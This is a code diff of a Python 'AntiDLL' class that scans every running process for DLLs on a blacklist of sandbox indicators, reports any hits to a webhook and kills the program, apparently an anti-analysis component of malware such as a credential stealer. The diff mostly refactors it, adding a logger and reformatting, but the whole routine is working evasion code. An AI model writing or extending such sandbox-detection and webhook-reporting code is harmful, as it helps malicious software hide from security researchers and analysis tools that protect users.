@@ -4,15 +4,15 @@ import time
 import win32api
 import win32process
 
-from ..utils.webhook import Webhook
-
 from ..constants import Lists
+from ..utils.webhook import Webhook
 
 
 class AntiDLL:
-    def __init__(self, webhook_url: str):
+    def __init__(self, webhook_url: str, logger):
         self.webhook_url = webhook_url
-        self.webhook = Webhook(webhook_url)
+        self.logger = logger
+        self.webhook = Webhook(self.webhook_url)
 
     def BlockDLLs(self) -> None:
         while True:
@@ -24,24 +24,26 @@ class AntiDLL:
                     try:
                         hProcess = win32api.OpenProcess(0x0410, 0, pid)
                         try:
-                            curProcessDLLs = win32process.EnumProcessModules(hProcess)
+                            curProcessDLLs = win32process.EnumProcessModules(
+                                hProcess)
                             for dll in curProcessDLLs:
                                 dllName = str(
-                                    win32process.GetModuleFileNameEx(hProcess, dll)
-                                ).lower()
+                                    win32process.GetModuleFileNameEx(
+                                        hProcess, dll)).lower()
                                 for sandboxDLL in Lists.BLACKLISTED_DLLS:
                                     if sandboxDLL in dllName:
                                         if dllName not in EvidenceOfSandbox:
                                             EvidenceOfSandbox.append(dllName)
                         finally:
                             win32api.CloseHandle(hProcess)
-                    except:
+                    except BaseException:
                         pass
                 if EvidenceOfSandbox:
+                    self.logger.info(f"The Following DLL's: {EvidenceOfSandbox} Were Found Loaded: Exit Status 1 ")
                     self.webhook.send(
                         f"The following sandbox-indicative DLLs were discovered loaded in processes running on the system. DLLS: {EvidenceOfSandbox}",
                         "Anti DLL",
                     )
                     os._exit(1)
-            except:
+            except BaseException:
                 pass
